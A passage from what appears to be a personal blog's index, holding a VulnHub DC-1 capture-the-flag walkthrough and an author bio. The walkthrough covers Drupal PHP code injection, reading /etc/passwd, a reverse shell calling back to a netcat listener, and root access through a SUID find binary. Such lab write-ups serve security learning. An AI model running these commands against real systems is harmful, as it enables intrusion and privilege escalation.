","date":"11-19-2023","objectID":"/dc-1/:4:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploiting PHP module Now that it’s enabled, lets see if we can create a PHP page under content. Maybe we can inject php code, like the php revshell by pentestmonkey! Or we may be able to grab the /etc/passwd file to see what users are on the box. Even better /etc/shadow file…, if we have root privs.. doubtful. Content \u003e Add Content \u003e Basic Page Title = Whatever you want Body is where we’ll test the injection… \u003c?php system(\"whoami\"); ?\u003e Change “Text Format” to the PHP code module, which is what we enabled with admin privs Then press preview… let’s see if we can grab the current user… We got a response! “www-data”. Injection is working! DC-1 Drupal 7 PHP code injection! Let’s change the command from whoami to cat /etc/passwd. Looks like another two users to notate. www-data and flag4 C-1 Drupal 7 PHP code injection - passwd file Trying sudo cat /etc/shadow fails, so we don’t have sudo or root privs. Sudo may not even be installed ","date":"11-19-2023","objectID":"/dc-1/:4:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"PHP revshell Now it’s time to get ourselves a revshell through php injection… let’s insert the following php code from this raw github file… PentestMonkey’s PHP revshell You’ll want to modify the following lines of code to match up with your nc -nvlp 1234 command. The PHP code will callback to netcat and allow us to connect via a shell on the DC-1 box. You can change the ports to whatever you’d like. $ip = ‘192.168.56.1’; // CHANGE THIS $port = 1234; // CHANGE THIS Now open up another terminal with the nc -nvlp 1234, I mentioned before. You should now have both: terminal with nc -nvlp 1234 running. Drupal Basic Page filled in with PentestMonkey’s reverse php shell Let’s hit preview and we should get a revshell as www-data. If we do, we’ll move onto privilege escalation. The Drupal page will likely hang, let it be. Minimize it and forget about it. If you refresh or close it, you’ll lose your revshell. We now have a revshell into the box but lacks tty! We’ll fix this in the next section. Let’s do a quick test by typing whoami into our new revshell. You should see “www-data”. DC-1 Drupal 7 - revshell w/o tty ","date":"11-19-2023","objectID":"/dc-1/:4:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Privilege Escalation At this point, we now have a revshell into DC-1 whom does not have root privs. We’ll need to find a way to escalate the privs, so we can ‘own’ the box! ","date":"11-19-2023","objectID":"/dc-1/:5:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Custom tty First thing I like to do is get a tty and make our local terminal not break connection even if you press CTRL+C. python -c 'import pty; pty.spawn(\"/bin/bash\")' export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp export TERM=xterm-256color alias ll='ls -lsaht --color=auto' Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 Now that you have a tty shell, with alias ll, and you can’t CTRL+C out of it on accident.. Let’s get to privesc(privilege escalation) but before that let’s update our ’notes’ Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.24 - php 5.4.45-0+deb7u14 - mysql version? Drupal -\u003e Admin acct created owned:owned with Drupal 7.x SQLi exploit -\u003e enabled php-code and created basic content to inject php-revshell giving us low-level shell. -\u003e shifted into a tty that doesn’t allow CTRL+C disconnects -\u003e now time to dig into privesc 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys Found Users: Fred ; admin ; www-data ; flag4 At this point, we want to look through the box and enumerate anything we can find. For time sake, we’ll skip most of this. We could transfer linpeas.sh to enumerate the system for us, but let’s try without it. I like to look for binaries that have SUID or GUID perms. These SUIDs and GUIDs are binaries that have a perm set to s in the user or group column. What makes these binaries so attractive is that they are executed with the owner’s privs(think root 😃) but can be accessible and executable by lower priv users/groups. Once we produce a list of SUID/GUID binaries, we can check them against GTFObins ","date":"11-19-2023","objectID":"/dc-1/:5:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"SUID Search Let’s look for SUID binaries! find / -perm -u=s -type f 2\u003e/dev/null DC-1 Drupal 7 - SUID search Here’s the find binary. Look at the perms. You’re looking for an s in place of the executable bit set for user group. DC-1 Drupal 7 - SUID example ","date":"11-19-2023","objectID":"/dc-1/:5:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Searching GTFObins Let’s look on GTFObins to see if any of these binaries have a SUID exploit that obtains and holds elevated privs. - /bin/mount - only has Sudo which isn’t installed on the box. So, pass. - /bin/ping - no SUID abuse - /bin/su - no SUID abuse - /bin/ping6 - isn’t listed - /bin/umount - isn’t listed - /usr/bin/at - no SUID abuse - /usr/bin/chsh - isn’t listed - /usr/bin/passwd - isn’t listed - /usr/bin/newgrp - isn’t listed - /usr/bin/chfn - isn’t listed - /usr/bin/gpasswd - isn’t listed - /usr/bin/procmail - isn’t listed - /usr/bin/find - WE HAVE A HIT! SUID bit can be abused! - command will be /usr/bin/find -exec /bin/sh \\; -quit ","date":"11-19-2023","objectID":"/dc-1/:5:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Abusing the SUID Copy/paste /usr/bin/find -exec /bin/sh \\; -quit in the tty remote shell you have running in your terminal and let’s see if we can abuse the SUID bit to escalate privs to root… $$$ - We have root! ","date":"11-19-2023","objectID":"/dc-1/:5:4","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"ROOTED! DC-1 Drupal 7 - ROOTED!!! ","date":"11-19-2023","objectID":"/dc-1/:6:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":null,"content":"whoami","date":"11-17-2023","objectID":"/whoami/","tags":null,"title":"","uri":"/whoami/"},{"categories":null,"content":"Hello world! whoami I am a born computer nerd who is trying to figure out how everything works. My path to cyber is fun and frustrating at the same time, so here’s a quick story… One day, I decided I wanted more out of my IT career and asked a cyber buddy where I should begin. He suggested that I apply myself in a home-built lab and obtain my Security+ certification, so I did just that. I first purchased a Security+ course on a major online learning platform and began studying. As I watched the Security+ course, I glanced at the page source to find the current video’s MP4 file exposed. I then force-browsed my way to the Security+ course’s root video directory, giving me access to all the Security+ course’s MP4 files… Big deal, right? I had paid for access. Well, after confirming this learning platform was part of a bug bounty program and that this discovery was in-scope, I wandered my way to a random unpaid-for course and found the directory structure by force-browsing from the course’s preview video URL. This ultimately led to the discovery of all the MP4 videos of the unpaid-for course! Did my intuition lead me to my first bug!? With the lack of experience I had, I was having a hard time believing the situation, so I confirmed the issue by looking over a few other courses, verifying the problem over and over. Despite my lack of experience with bug reporting, the report I submitted was effective. After few days passed, I revisited and verified that the issue had been fixed, later receiving a reply stating that no issues were found. 😡 Even though I was upset, I learned two important things that day: I found my passion in cybersecurity and it stems from the idea of helping others protect their data. Making clear, concise, and detailed reports is a very important! Anyways, why this blog? Provide a resource for others. 😃 Showcase my knowledge to employers. 😉 Now go dig around! ","date":"11-17-2023","objectID":"/whoami/:0:0","tags":null,"title":"","uri":"/whoami/"}]